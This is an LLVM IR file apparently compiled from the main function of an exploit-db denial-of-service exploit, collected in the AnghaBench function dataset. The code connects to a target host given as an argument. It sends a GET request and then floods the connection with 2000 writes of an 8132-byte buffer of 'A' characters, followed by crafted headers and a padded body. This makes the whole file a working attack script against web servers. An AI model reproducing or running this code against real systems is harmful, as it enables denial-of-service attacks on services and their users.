; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_371.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_371.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }

@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@A = common dso_local global i8 0, align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"%s: IP\0A\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"[x] Connected to: %s.\0A\00", align 1
@hrm = common dso_local global %struct.TYPE_2__ zeroinitializer, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"Host: %s\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"Content-Length: 50\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"GET / HTTP/1.0\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[x] Sending buffer...\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [300 x i8], align 16
  %9 = alloca [8132 x i8], align 16
  %10 = alloca [50 x i8], align 16
  %11 = alloca [100 x i8], align 16
  %12 = alloca [100 x i8], align 16
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 1
  %17 = load i8*, i8** %16, align 8
  store i8* %17, i8** %13, align 8
  %18 = call i8* @malloc(i32 4)
  store i8* %18, i8** %14, align 8
  %19 = load i8*, i8** %14, align 8
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %19, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0))
  %21 = getelementptr inbounds [8132 x i8], [8132 x i8]* %9, i64 0, i64 0
  %22 = call i32 @memset(i8* %21, i8 signext 0, i32 8132)
  %23 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %24 = call i32 @memset(i8* %23, i8 signext 0, i32 100)
  %25 = getelementptr inbounds [100 x i8], [100 x i8]* %12, i64 0, i64 0
  %26 = call i32 @memset(i8* %25, i8 signext 0, i32 100)
  %27 = getelementptr inbounds [8132 x i8], [8132 x i8]* %9, i64 0, i64 0
  store i8 32, i8* %27, align 16
  store i32 1, i32* %6, align 4
  br label %28

28:                                               ; preds = %36, %2
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %29, 8132
  br i1 %30, label %31, label %39

31:                                               ; preds = %28
  %32 = load i8, i8* @A, align 1
  %33 = load i32, i32* %6, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [8132 x i8], [8132 x i8]* %9, i64 0, i64 %34
  store i8 %32, i8* %35, align 1
  br label %36

36:                                               ; preds = %31
  %37 = load i32, i32* %6, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %6, align 4
  br label %28

39:                                               ; preds = %28
  %40 = load i32, i32* %4, align 4
  %41 = icmp slt i32 %40, 2
  br i1 %41, label %42, label %48

42:                                               ; preds = %39
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* %45)
  %47 = call i32 @exit(i32 0) #3
  unreachable

48:                                               ; preds = %39
  %49 = load i8*, i8** %13, align 8
  %50 = call i32 @conn(i8* %49)
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @hrm, i32 0, i32 0), align 4
  %52 = call i8* @inet_ntoa(i32 %51)
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0), i8* %52)
  %54 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 (i8*, i8*, ...) @sprintf(i8* %54, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %57)
  %59 = getelementptr inbounds [100 x i8], [100 x i8]* %12, i64 0, i64 0
  %60 = call i32 (i8*, i8*, ...) @sprintf(i8* %59, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %61 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %62 = call i32 (i8*, i8*, ...) @sprintf(i8* %61, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %63 = load i32, i32* %7, align 4
  %64 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %65 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @write(i32 %63, i8* %64, i32 %66)
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %69

69:                                               ; preds = %83, %48
  %70 = load i32, i32* %6, align 4
  %71 = icmp slt i32 %70, 2000
  br i1 %71, label %72, label %86

72:                                               ; preds = %69
  %73 = load i32, i32* %7, align 4
  %74 = getelementptr inbounds [8132 x i8], [8132 x i8]* %9, i64 0, i64 0
  %75 = getelementptr inbounds [8132 x i8], [8132 x i8]* %9, i64 0, i64 0
  %76 = call i32 @strlen(i8* %75)
  %77 = call i32 @write(i32 %73, i8* %74, i32 %76)
  %78 = load i32, i32* %7, align 4
  %79 = load i8*, i8** %14, align 8
  %80 = load i8*, i8** %14, align 8
  %81 = call i32 @strlen(i8* %80)
  %82 = call i32 @write(i32 %78, i8* %79, i32 %81)
  br label %83

83:                                               ; preds = %72
  %84 = load i32, i32* %6, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %6, align 4
  br label %69

86:                                               ; preds = %69
  %87 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %88 = call i32 @memset(i8* %87, i8 signext 0, i32 300)
  %89 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %90 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i64 0, i64 0
  %91 = call i32 @strcpy(i8* %89, i8* %90)
  %92 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %93 = getelementptr inbounds [100 x i8], [100 x i8]* %12, i64 0, i64 0
  %94 = call i32 @strcat(i8* %92, i8* %93)
  store i32 0, i32* %6, align 4
  br label %95

95:                                               ; preds = %103, %86
  %96 = load i32, i32* %6, align 4
  %97 = icmp slt i32 %96, 50
  br i1 %97, label %98, label %106

98:                                               ; preds = %95
  %99 = load i8, i8* @A, align 1
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [50 x i8], [50 x i8]* %10, i64 0, i64 %101
  store i8 %99, i8* %102, align 1
  br label %103

103:                                              ; preds = %98
  %104 = load i32, i32* %6, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %6, align 4
  br label %95

106:                                              ; preds = %95
  %107 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %108 = getelementptr inbounds [50 x i8], [50 x i8]* %10, i64 0, i64 0
  %109 = call i32 @strcat(i8* %107, i8* %108)
  %110 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %111 = call i32 @strcat(i8* %110, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0))
  %112 = load i32, i32* %7, align 4
  %113 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %114 = getelementptr inbounds [300 x i8], [300 x i8]* %8, i64 0, i64 0
  %115 = call i32 @strlen(i8* %114)
  %116 = call i32 @write(i32 %112, i8* %113, i32 %115)
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %118 = load i32, i32* %7, align 4
  %119 = call i32 @close(i32 %118)
  %120 = load i32, i32* %3, align 4
  ret i32 %120
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @conn(i8*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
